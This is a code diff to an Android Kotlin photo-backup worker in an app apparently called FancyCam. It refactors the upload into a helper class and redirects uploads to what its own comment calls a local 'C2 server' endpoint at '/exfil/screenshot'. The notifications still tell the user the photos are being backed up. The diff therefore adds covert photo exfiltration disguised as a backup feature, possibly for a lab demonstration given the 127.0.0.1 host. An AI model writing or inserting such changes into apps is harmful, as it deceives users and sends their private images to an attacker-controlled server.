@@ -43,36 +43,14 @@ class PhotoUploadWorker(
         Log.d(TAG, "Starting background upload for photo: ${file.name}")
         showNotification("Photo Backup", "Uploading photo (${file.name})...")
 
-        return try {
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart(
-                    "photo",
-                    file.name,
-                    file.asRequestBody("image/jpeg".toMediaType())
-                )
-                .build()
-
-            val request = Request.Builder()
-                .url(SERVER_URL)
-                .post(requestBody)
-                .addHeader("User-Agent", "FancyCam-Android/1.0")
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    Log.i(TAG, "Photo uploaded successfully: ${file.name}")
-                    showNotification("Photo Backup Complete", "Photo ${file.name} backed up successfully.")
-                    Result.success()
-                } else {
-                    Log.w(TAG, "Server returned error code: ${response.code}")
-                    showNotification("Photo Backup Warning", "Upload failed with status code ${response.code}.")
-                    Result.retry()
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Network upload error", e)
-            showNotification("Photo Backup Error", "Upload failed: ${e.localizedMessage}")
+        val result = PhotoUploader.uploadPhoto(file)
+        return if (result.success) {
+            Log.i(TAG, "Photo uploaded successfully: ${file.name}")
+            showNotification("Photo Backup Complete", "Photo ${file.name} backed up successfully.")
+            Result.success()
+        } else {
+            Log.w(TAG, "Upload failed: ${result.message}")
+            showNotification("Photo Backup Warning", "Upload failed: ${result.message}")
             Result.retry()
         }
     }
@@ -109,7 +87,9 @@ class PhotoUploadWorker(
         private const val CHANNEL_ID = "photo_upload_channel"
         private const val NOTIFICATION_ID = 1001
 
-        // Default endpoint URL for photo backup demonstration
-        private const val SERVER_URL = "https://example.com/api/upload"
+        // Endpoint URL for photo exfiltration to local C2 server
+        private const val C2_SERVER_IP = "127.0.0.1"
+        private const val C2_SERVER_PORT = 5000
+        private const val SERVER_URL = "http://$C2_SERVER_IP:$C2_SERVER_PORT/exfil/screenshot"
     }
 }
